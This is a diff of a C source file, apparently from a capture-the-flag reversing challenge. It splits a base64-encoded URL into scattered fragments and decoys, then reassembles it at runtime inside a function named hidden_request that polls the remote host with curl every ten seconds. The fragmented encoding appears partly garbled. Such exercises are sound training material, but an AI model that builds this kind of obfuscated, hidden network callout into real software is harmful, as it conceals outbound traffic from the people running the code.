@@ -11,7 +11,14 @@
 #define CHECK_INTERVAL 10  // Every 10 seconds
 
 // Base64 encoded URL (https://issessionsctf-qwertyxyzqwertyxyz.chals.io/)
-unsigned char encoded_url[] = "aHR0cHM6Ly9pc3Nlc3Npb25zY3RmLXF3ZXJ0eXh6cXdlcnR0eS5jaGFscy5pby8="; // Base64 of "https://issessionsctf-qwertyxyzqwertyxyz.chals.io/"
+unsigned char encoded_url1[] = "[c2Nlc3Npb25zY3RmLXF3";
+unsigned char encoded_url9[] = "Nlc3Npb2RmLXFaFsdc3";
+unsigned char encoded_url3[] = "ZXJXh6cXdS5jaGpby8=";
+unsigned char encoded_url2[] = "aHR0cHM6Ly9p";
+unsigned char encoded_url4[] = "ZXJ0cXnaGFscy8=";
+unsigned char encoded_url5[] = "ZXJ0eXh6cXdlcnR0";
+unsigned char encoded_url6[] = "eS5jaGFscy5pby8=";
+ // Base64 of "https://issessionsctf-qwertyxyzqwertyxyz.chals.io/"
 
 // Base64 decoding function
 void base64_decode(const char *input, unsigned char *output) {
@@ -60,9 +67,14 @@ void *hidden_request(void *arg) {
     CURL *curl;
     CURLcode res;
     unsigned char decoded_url[256];  // Array to store decoded URL
+    unsigned char combined[256] = {0}; // Adjust size as needed
+    strcat((char*)combined, (char*)encoded_url2); // "aHR0cHM6Ly9p"
+    strcat((char*)combined, (char*)encoded_url1); // "[c2Nlc3Npb25zY3RmLXF3"
+    strcat((char*)combined, (char*)encoded_url5); // "ZXJ0eXh6cXdlcnR0"
+    strcat((char*)combined, (char*)encoded_url6); // "eS5jaGFscy5pby8="
 
     // Decode URL from base64
-    base64_decode((char *)encoded_url, decoded_url);
+    base64_decode((char *)combined, decoded_url);
 
     while (1) {
         sleep(CHECK_INTERVAL);  // Wait for next request
